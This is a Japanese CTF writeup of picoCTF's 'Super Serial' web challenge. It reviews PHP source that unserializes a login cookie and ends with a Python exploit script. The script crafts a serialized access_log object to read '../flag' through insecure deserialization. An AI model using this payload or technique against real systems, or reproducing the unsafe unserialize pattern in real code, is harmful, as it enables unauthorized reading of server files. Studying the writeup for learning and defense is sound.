---
title: 'SuperSerial - picoCTF'
description: 'Super SerialのWriteupです。'
pubDate: 2025-12-24
category: 'CTF'
tags: ['picoCTF', 'Writeup', 'Web', 'PHP Object']
---

# SuperSerial - picoCTF

## 初期調査

sqliかなと思いペイロードを入れて送信
```
Fatal error: Uncaught Exception: Unable to open database: unable to open database file in /var/www/html/index.php:5 Stack trace: #0 /var/www/html/index.php(5): SQLite3->__construct('../users.db') #1 {main} thrown in /var/www/html/index.php on line 5
```
次にrobots.txtを見てみると `/admin.phps` アクセスしてみても表示されない\
試しに `index.phps` phpのコードを見ることができた。\
ファイルを追っていくと
- index.php
- cookie.php
- authentication.php

これらがあることがわかった。

## コードレビュー

<details>
<summary>index.php</summary>

```php
# index.php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```
</details>

<details>
<summary>cookie.php</summary>

```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```
</details>

<details>
<summary>authentication.php</summary>

```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```
</details>

### 解析
`cookie.php`>`unserialize`と`authentication.php`>`access_log`が今回の肝

unserializeということはserializeの形式を考慮する必要が出る。\
`O:<クラス名の長さ>:"<クラス名>":<プロパティ数>:{<プロパティ定義>}`\
そしてaccess_logクラスのtoString(ファイル読み出し)、file_get_contents(ファイル取得)これらを利用して任意のファイルを読み出すことが可能となる。

**＊cookie.phpでunserializeされることでauthentication.phpのaccess_logクラスが悪用される。**

初期調査で`../users.db`このエラーが出ており、users.dbに何かあるかと思いexploitでファイルの位置を探っていたがハズレだった。ヒントを確認したところ`../flag`と書かれていた。

## exploit

```py
import requests
from urllib.parse import *
import base64

payload = 'O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}'
enc = base64.b64encode(payload.encode()).decode()
enc = quote(enc)

URL = "http://challenge-host"
endpoint = "/authentication.php"
headers = {
  "Cookie": f"login={enc}"
}

req = requests.get(urljoin(URL, endpoint), headers=headers)

print(req.text)
```

実行:

```
$ python3 exploit.py
Deserialization error. picoCTF{***}